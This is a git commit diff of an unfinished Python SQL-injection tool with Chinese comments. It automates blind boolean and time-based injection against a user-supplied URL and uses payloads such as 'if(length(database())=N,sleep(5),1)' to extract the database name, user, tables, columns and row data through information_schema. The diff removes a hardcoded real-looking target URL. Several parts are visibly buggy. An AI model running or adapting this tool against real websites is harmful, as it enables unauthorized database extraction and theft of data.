fd19973539b1cc923dd839d4d2f5104be0f6a427
挺无聊的 <1184028304@qq.com>
2019-05-20 22:27:29 +0800

    改进了一些逻辑，仍未完工

--- SQLInjection.py
+++ SQLInjection.py
@@ -6,13 +6,20 @@ from urllib.parse import urlparse
 from urllib.parse import urlunsplit
 import re
 import requests
+import time
 
 
 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
 
 class SQL():
-    def __init__(self,url):
-        self.url=url        #设置全局url
+    def __init__(self,url,check_text,check_way):
+        if re.match("http[s]",url):
+            self.url=url        #设置全局url
+        else:
+            self.url="http://"+url
+        print(self.url)
+        self.check_text=check_text   #设置全局验证内容
+        self.check_way=check_way     #设置验证方法
         self.ParseURL(url)  #解析url，拆分
         self.RUN()          #启动
 
@@ -33,33 +40,25 @@ class SQL():
         self.url_comment=parse_url.fragment
 
 
-    def CheckText(self,text):
+    def Check(self,text):
         '''
         检验布尔，若网页返回值有特征码，返回True
         :param text: 网页返回值
         :return:
         '''
-        if text in check_text:      #如果结果出现预先得到的测量值，返回布尔成功
+        if self.check_text in text:      #如果结果出现预先得到的测量值，返回布尔成功
             return True
         else:
             return False
 
-    def CheckSleep(self,x):
-        '''
-        判断布尔注入是否导致系统休眠
-        :param x:
-        :return: True/False
-        '''
-        pass
 
 
     def RUN(self):
         '''
-
+        启动爆破
         :return:
         '''
-        # burp_url = [self.url_scheme, self.url_netloc, self.url_path, self.url_query, '']
-        # self.x = urlunsplit(burp_url)
+
         self.GuessTables()
 
 
@@ -70,10 +69,13 @@ class SQL():
         :return:数据长度
         '''
         for i in range(1,256):
-            X="{0} and if(length({1})={2},sleep(5),1) %23".format(self.url,data,i)   #payload为查询成功即系统休眠5秒
+            X="{0} and if(length({1})={2},{3},1) %23".format(self.url,data,i,self.check_way)
             #print(X)
-            res=requests.get(X)
-            if self.CheckSleep(res.text):
+            time.sleep(0.1)
+            res=requests.get(X,headers=headers)
+            dum=requests.get(X,headers={'Connection':'close'})   #关闭网络流
+            #print(res.text)
+            if self.Check(res.text):         #传入判断
                 return i
 
 
@@ -89,10 +91,12 @@ class SQL():
         length = []  # 存放各表长度
         for i in range(1, num + 1):
             for j in range(1, 100):
-                X = "{0} and IF((select length({3}) from information_schema.{4} where table_schema=database() limit {1} ,1)={2},sleep(5),1) %23".format(
-                    self.url, i, j,data,table)
-                res = requests.get(X)
-                if self.CheckSleep(res.text):
+                X = "{0} and IF((select length({3}) from information_schema.{4} where table_schema=database() limit {1} ,1)={2},{5},1) %23".format(
+                    self.url, i, j,data,table,self.check_way)
+                time.sleep(0.1)
+                res = requests.get(X, headers=headers)
+                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                if self.Check(res.text):     #传入判断
                     length.append(j)
                     break
 
@@ -106,15 +110,21 @@ class SQL():
         :return: 爆破结果
         '''
         x=[]
+        #length=int(length)
         for i in range(1,length+1):
             for j in range(32,127):
-                X = "{0} and IF(ascii(substr({1},{2},1))={3},sleep(5),1) %23".format(self.url, data, i, j)
-                res = requests.get(X)
-                if self.CheckSleep(res.text):
+                X = "{0} and IF(ascii(substr({1},{2},1))={3},{4},1) %23".format(self.url, data, i, j,self.check_way)
+                time.sleep(0.1)
+                res = requests.get(X, headers=headers)
+                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                if self.Check(res.text):      #传入判断
                     x.append(chr(j))
                     break
-        x="".join(x)                        #list>>str
+        x="".join(x)                        # list>>str
         return x
+
+
+
 
     def BurpTables(self,num):
         '''
@@ -129,13 +139,18 @@ class SQL():
         for i in range(1,num+1):
             for l in range(1,length[i]+1):
                 for j in range(32,127):
-                    X="{0} and IF((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{1},1)={2},sleep(5),1)%23".format(self.url,l,j)
-                    res=requests.get(X)
-                    if self.CheckSleep(res.text):
+                    X="{0} and IF((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{1},1)={2},{3},1)%23".format(self.url,l,j,self.check_way)
+                    time.sleep(0.1)
+                    res = requests.get(X, headers=headers)
+                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                    if self.Check(res.text):        #传入判断
                         m.append(chr(j))
             n.append(m)
             m=''
         return n
+
+
+
 
     def BurpColumns(self,num,table):
         '''
@@ -147,11 +162,13 @@ class SQL():
         length = []  # 存放各列长度
         for i in range(1, num + 1):
             for j in range(1, 100):
-                X = "{0} and IF((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit {1} ,1)={2},sleep(5),1) %23".format(
-                    self.url, i, j, self.str_to_hex(table))
-                res = requests.get(X)
-                if self.CheckSleep(res.text):
-                    length.append(j)
+                X = "{0} and IF((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit {1} ,1)={2},{3},1) %23".format(
+                    self.url, i, j, self.str_to_hex(table),self.check_way)
+                time.sleep(0.1)
+                res = requests.get(X, headers=headers)
+                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                if self.Check(res.text):     #传入判断
+                    length.append(j)         # list拼接
                     break
 
         m = []  # 存储当前字母
@@ -160,13 +177,15 @@ class SQL():
         for i in range(1, num + 1):
             for l in range(1, length[i]+1):
                 for j in range(32, 127):
-                    X = "{0} and IF((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit 0,1),{1},1)={2},sleep(5),1)%23".format(
-                        self.url, l, j,self.str_to_hex(table))
-                    res = requests.get(X)
-                    if self.CheckSleep(res.text):
-                        m.append(chr(j))
-            n.append(m)
-            m = ''
+                    X = "{0} and IF((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit 0,1),{1},1)={2},{4},1)%23".format(
+                        self.url, l, j,self.str_to_hex(table),self.check_way)
+                    time.sleep(0.1)
+                    res = requests.get(X, headers=headers)
+                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                    if self.Check(res.text):   #传入判断
+                        m.append(chr(j))       #拼接字母
+            n.append(m)                        #名称拼接入list
+            m = ''                             #临时存储点置空
         return n
 
     def BurpDatas(self,columns):
@@ -175,13 +194,16 @@ class SQL():
         :param columns:列list
         :return:
         '''
-        data=[]
+        data=[]      #数据名称list
         for column in columns:
             for j in range(32,127):
-                X="{0} and IF(ascii(select {1} from {2} limit 0,1),{3},1))={4},sleep(5),1) %23".format(self.url,column,"table","length",j)
-                res = requests.get(X)
-                if self.CheckSleep(res.text):
-                    data.append(i)  # 各表中列数量
+                X="{0} and IF(ascii(select {1} from {2} limit 0,1),{3},1))={4},{5},1) %23".format(self.url,column,"table","length",j,self.check_way)
+                # 上式未完成，table，length
+                time.sleep(0.1)
+                res = requests.get(X, headers=headers)
+                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                if self.Check(res.text):     #传入判断
+                    data.append(i)  # 存储各列数据入list
                     break
 
 
@@ -195,41 +217,50 @@ class SQL():
         '''
         m = []
         for a in str:
-            m.append(str(ord(a)))
-        n = "".join(m)
-        n = int(n)
-        res=hex(n)
-        return str(res)
+            m.append(str(ord(a)))   #先转为ASCII码，10进制
+        n = "".join(m)              #ASCII码拼接
+        n = int(n)                  #转为整型
+        res=hex(n)                  #单位转换，10=>16
+        return str(res)             #返回字符串
+
+
+
+
 
     def GuessColumns(self, tables):
         '''
         猜测列名
-        :param tables:
+        :param tables:包含所有表名的list
         :return:
         '''
 
-        num_columns=[]
-        for table in tables:
-            for i in range(1,100):
-                X="{0} and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={2})={1},sleep(5),1) %23".format(self.url,i,self.str_to_hex(table))  #获取表数量
+        num_columns=[]     #存储各表的列数量
+        for table in tables:   #逐个取表名
+            for i in range(1,100):    #列名长度范围
+                X="{0} and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={2})={1},{3},1) %23".format(self.url,i,self.str_to_hex(table),self.check_way)  #获取表数量
                 # print(X)
-                res=requests.get(X)
-                if self.CheckSleep(res.text):
-                    num_columns.append(i)                     #各表中列数量
+                time.sleep(0.1)
+                res = requests.get(X, headers=headers)
+                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                if self.Check(res.text):                      #传入判断
+                    num_columns.append(i)                     #存储各表中列数量
                     break
 
 
-        for num,table in num_columns,tables:
-            if num !=0:
+        for num,table in num_columns,tables:                   #依次获取表的列数量及名称
+            if num !=0:                                        #若为空表，退出
                 length = []  # 存放各列长度
                 for i in range(1, num + 1):
                     for j in range(1, 100):
                         X = "{0} and IF((select length({3}) from information_schema.columns where table_schema=database() and table_name={4} limit {1} ,1)={2},sleep(5),1) %23".format(
                             self.url, i, j, "column_name",self.str_to_hex(table))
-                        res = requests.get(X)
-                        if self.CheckSleep(res.text):
+                        time.sleep(0.1)
+                        res = requests.get(X, headers=headers)
+                        dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+                        if self.Check(res.text):                #传入判断
                             length.append(j)
                             break
+
 
                 for l in length:
                     Column=[]
@@ -237,7 +268,9 @@ class SQL():
                     Column.append(x)
                     self.columns="".join(column)
 
-        self.BurpDatas(self.columns)
+            else:
+                break
+        self.BurpDatas(self.columns)        #爆破列数据
 
 
 
@@ -249,14 +282,21 @@ class SQL():
         '''
         self.length_database=self.BurpLength("database()")    #获取数据库名称长度
         self.length_user=self.BurpLength("user()")            #获取数据库用户名称长度
+        print("数据库名称长度"+str(self.length_database))
+        print("数据库用户名称长度"+str(self.length_user))
+
         self.database=self.BurpChars("database()",self.length_database)    #获取数据库名称
         self.db_user=self.BurpChars("user()",self.length_user)             #获取数据库用户名名称
+        print(self.database)
+        print(self.db_user)
 
         for i in range(1,100):
             X="{0} and if((select count(table_name) from information_schema.tables where table_schema=database())={1},sleep(5),1) %23".format(self.url,i)  #获取表数量
             # print(X)
-            res=requests.get(X)
-            if self.CheckSleep(res.text):
+            time.sleep(0.1)
+            res = requests.get(X, headers=headers)
+            dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
+            if self.Check(res.text):
                 self.number_tables=i                     #表数量
                 break
 
@@ -270,13 +310,22 @@ class SQL():
 
 
 def main():
-    # try:
-    #     url=sys.argv[1]
-    # except:
-    #     url=input("请输入带参闭合的URL，例子：www.domain.com/?id=1'")
-    #check_text=input("请输入页面布尔注入成功后的特征值，源码可见：")
-    url="http://www.keyboy.xyz/index.php/?id=1"
-    SQL(url)
+    try:
+        url=sys.argv[1]
+    except:
+        url=input("请输入带参闭合的URL，例子：www.domain.com/?id=1'\n")
+    check_way=input("请选择判断方式：1,页面内容变动判断 2,延时注入\n")
+    if check_way == "1":
+        check_way="0"        #查询成功时的返回值
+        check_text=input("请输入页面布尔注入成功后的特征值，源码可见：\n")
+        SQL(url, check_text,check_way)
+    else:
+        check_way="sleep(5)"    #延时注入条件
+        check_text=""           #此时没必要存在
+        SQL(url,check_text,check_way)
+
+
+
 
 
 if __name__ =="__main__":
